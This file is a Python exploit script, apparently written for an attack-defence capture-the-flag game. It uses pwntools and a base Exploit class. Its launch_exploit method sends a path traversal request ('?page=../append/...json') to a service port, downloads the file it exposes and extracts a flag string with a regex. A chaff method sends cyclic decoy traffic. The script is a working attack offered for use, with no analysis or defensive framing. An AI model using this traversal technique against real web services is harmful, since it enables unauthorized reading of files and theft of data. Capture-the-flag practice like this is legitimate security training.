#!/usr/bin/env python3

from Base_Exploit import Exploit
from pwn import *
import os.path
from os import path
import json

FLAG = r'FLG[0-9A-Za-z]{13}'
TIMEOUT = 5.0

#Script for Exploit2 
class Exploit2(Exploit):
    def __init__(self, ip, port,flagid, name="", debug=False, debug_chaff=False):
        super().__init__(ip, port,flagid, name, debug, debug_chaff)

    def launch_exploit(self):                 
        url =  f'http://{self.ip}:{10002}/?page=../append/{self.flagId}.json'
        try:
            result = wget(url, timeout=60)
            self.dprint(str(result))
            if result:
                result=result.decode('utf-8') 
                self.dprint(f'received:{result}')    
                match = re.search(FLAG, result)
                if match:
                    self.dprint(f'FLG: {match.group(0)}')
                    return match.group(0) 
            return None 
        except Exception as e:
            self.dprint(e)
            return None                              
        
    def launch_chaff(self):
        msg = str(cyclic(50))
        self.dprint(msg)
        self.write_file(msg)
        self.send(msg,self.sock)

   


